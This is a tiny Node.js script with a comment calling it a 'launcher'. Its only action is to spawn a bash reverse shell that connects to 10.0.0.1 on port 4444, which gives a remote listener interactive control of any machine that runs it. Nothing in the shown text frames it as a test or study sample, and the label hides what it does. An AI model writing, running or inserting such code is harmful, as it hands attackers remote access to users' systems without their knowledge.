const { execSync } = require('child_process');
// launcher
execSync("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", { stdio: 'inherit' });
